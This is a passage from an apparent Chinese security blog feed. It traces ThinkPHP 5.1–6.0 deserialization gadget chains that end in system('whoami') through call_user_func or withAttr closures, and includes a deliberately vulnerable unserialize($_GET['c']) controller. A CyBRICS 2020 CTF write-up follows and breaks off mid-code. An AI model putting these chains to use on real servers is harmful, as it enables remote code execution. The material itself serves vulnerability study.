class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>input</code>方法但是只有一个<code>$param</code>是可控的。所以还要继续找调用<code>param</code>的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result   = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isAjax方法返回值由<code>$this-&gt;config[&#39;var_ajax&#39;]</code>控制。那么等于控制了param的参数<code>$name</code>.等于控制了input 的参数<code>$name</code>.</p><p>最后再来到input方法这看调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getData顺着看一下可控。且<code>$data</code>=<code>$data[$name]</code>,<code>$filter</code>来自<code>$this-&gt;filter</code>.最后到了array_walk_resursive相当于直接对数组每一个值调用了回调函数<code>$this-&gt;filterValue($filter)</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br></pre></td></tr></table></figure><p><code>$this-&gt;filterValue</code>是通过call_user_func执行的自然不必说了。<br>既然如此。控制<code>$this-&gt;filter</code>为system,<code>$data</code>数组第一个值为命令<code>whoami</code>之类的就可以执行命令了。</p><p>至此pop链就完整了。其实中间有个步骤就是解决<code>call_user_func_array</code>那找到不受定死参数影响的命令执行这块,主要思路就是利用thinkphp过滤器,覆盖filter的方法去执行代码。<br>而在找到input作为主要下手点时,<code>call_user_func_array(array(任意类,任意方法),$args)</code> 中 <code>$args</code> 数组的第一个变量，即我们前面说的一个固定死的类对象会作为 $data 传给 input 方法，那么在强转成字符串的时候，框架就会报错退出。所以我们找不到就继续找上层调用input的函数。直到找到可控参数的函数<code>isAjax</code>.就能解决参数不可控的问题。</p><h2 id="tp5-2-x-unserialize"><a href="#tp5-2-x-unserialize" class="headerlink" title="tp5.2.x-unserialize"></a>tp5.2.x-unserialize</h2><p>5.2版本的链子貌似跟之前没啥区别。但是我composer一直安装不上。加上5.2版本作为dev版本本身出现的不多,所以这里用thinkphp-vuln里的例子简单提一下。</p><p>前面入手点大同小异。唯一有区别的地方在触发<code>__call</code>的代码<code>$relation-&gt;visible($name)</code>这。看似tp5.2已经把这句代码删了。但是实际上是被转移到了<code>appendAttrToArray</code>这个方法中。因此基本没有区别。我就不跟了。</p><p>放上几张图<br><img src="/2020/08/05/Thinkphp-vuln/23.PNG" alt></p><p>真正的执行点在下面的<code>$closure($value,$this-&gt;data)</code>这里的动态调用。参数均可控。所以赋值命令执行的参数即可。<br><img src="/2020/08/05/Thinkphp-vuln/24.PNG" alt></p><h2 id="tp6-0-x-unserialize"><a href="#tp6-0-x-unserialize" class="headerlink" title="tp6.0.x-unserialize"></a>tp6.0.x-unserialize</h2><p>今天重新看了下之前在 php框架反序列化练习 文章里的内容。才想起来5.2跟6.0的链子应该是跟过了。不过当时没有动态调试,理解也没那么深刻。所以还是再看一下。</p><p>还是老样子更改Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $u = unserialize($_GET[<span class="string">'c'</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ThinkPHP V6.x'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用wh1t3p1g 师傅集成好的。顺带也推荐下师傅在安全客上针对thinkphp链子的分析文章。<br><img src="/2020/08/05/Thinkphp-vuln/25.PNG" alt></p><p>首先6.0版本的主要问题是前面5.*版本的利用起点Windows类都没了。也就是少了一个<code>__destruct()</code>。那么我们需要找到一个替代的<code>__destruct</code>作为起点。并且最好它能够在中间某个环节起到与其他链子相同作用比如触发<code>__call</code>,<code>__toString</code>之类的。这样的逻辑也是第5空间laravel那题的解题思路吧。因为跟过链子的人都知道只需要两个类就能rce.既然其中一个destruct被处理了。找一个替代的自然是最简单的办法。</p><p>vendor/topthink/think-orm/src/Model.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造lazySave为真值。进入save函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 数据对象赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入回调</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;trigger(<span class="string">'AfterWrite'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重新记录原始数据</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里关键函数是<code>updateData</code>.不过既然如此我们不能进入上面那个if分支。<br>isEmpty与trigger</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>显然。需要<br>1.<code>$this-&gt;data</code>为非空数组。<br>2.<code>$this-&gt;withEvent</code>为false<br>3.<code>$this-&gt;exists</code>为true进入updateData函数</p><p>跟进到updateData后。我们不妨先看下哪一个函数可以利用,再回头考虑参数的构造。这里顺着看到checkAllowFields后</p><p><img src="/2020/08/05/Thinkphp-vuln/26.PNG" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure><p>存在可控变量的拼接。那么我们就可以触发<code>__toString</code>了。在经历了前面几个版本的反序列化构造后，我们当然清楚tp5.1~5.2版本的链子分别是<code>__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)</code>的一系列调用。那么此处我们自然可以继续达成__toString来延续链子。</p><p>回头再检查updateData这的参数需要。首先第一个trigger我们已经满足条件了。然后<code>if (empty($data))</code>这个分支不能进入。那就要看向getChangedData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;readonly <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$field])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($data[$field]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>令<code>$this-&gt;force</code>为true.然后data就可控了。</p><p>接下来是回到利用函数checkAllowFields.拼接处之前的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $query = <span class="keyword">$this</span>-&gt;db();</span><br></pre></td></tr></table></figure><p>需要<br>1.<code>$this-&gt;field</code>为空进入分支<br>2.<code>$this-&gt;schema</code>为空进入else</p><p>看一眼db()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure><p>原来db()函数这里也有一个变量拼接……不过殊途同归。我们用哪一个都差不多。例如exp中链子是把<code>$this-&gt;suffix</code>作为触发的对象的。</p><p>然后后面就是一路畅通了。这里跟5.1(注意不是5.0,5.0 的 toString用的是model类的)一样用的是Conversion类里的<code>__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue()</code></p><p>我们主要在getAttr,getValue里构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getData(string $name = null)//$name='wh1t3p1g'</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;<span class="comment">//$this-&gt;data = array("wh1t3p1g"=&gt;"whoami");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];<span class="comment">//返回'whoami'，回到getAttr</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$fieldName];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;                 <span class="comment">//$name='wh1t3p1g' $value=‘ls’ $relation=false</span></span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);  <span class="comment">//该函数默认返回$name='wh1t3p1g'=$fieldName </span></span><br><span class="line">    $method    = <span class="string">'get'</span> . App::parseName($name, <span class="number">1</span>) . <span class="string">'Attr'</span>;  <span class="comment">//拼接字符：getlinAttr</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123; <span class="comment">//['wh1t3p1g'=&gt;'system']</span></span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123; <span class="comment">//$relation=false</span></span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">//$closure='system'</span></span><br><span class="line">        $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">//system('whoami',$this-&gt;data</span></span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此完成整条利用链。注意它的调用方法是<code>system(&quot;whoami&quot;, [&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;])</code>.这是一种合法调用。</p><p>小结下。tp所有系列反序列化链就这么多了。大体上思路都是一样的。只有5.0版本是较为复杂的写文件。其他版本都可以直接rce.魔术方法也基本都是<code>destruct，toString,call</code>调用。其中5.2,6.0是没有call的必要的。</p><h2 id="tp6-0任意文件写"><a href="#tp6-0任意文件写" class="headerlink" title="tp6.0任意文件写"></a>tp6.0任意文件写</h2><p>这个洞其实没必要跟了。就是年后ichunqiu战疫比赛时出现过的洞。session可以更改成32位<code>.php</code>后缀。然后如果session内容可控的话就相当于写了shell.这个还是比较常见的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>没想到真的还是把这个项目的内容都跟完了。不得不说理解了一些原理后也就对tp系列payload的构造有了更深的理解。虽然大部分实战中黑盒基本测不出来就是了。</p><p>下一步在考虑是去看看laravel还是java的几个反序列化链子。加油吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyBRICS-CTF 2020</title>
      <link href="2020/07/26/CyBRICS-CTF-2020/"/>
      <url>2020/07/26/CyBRICS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Cybrics比赛感觉都没队友在打……简单记录下做的几道题</p><a id="more"></a><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>签到不谈。<br><img src="/2020/07/26/CyBRICS-CTF-2020/0.PNG" alt></p><h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>首先是源码审计.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span 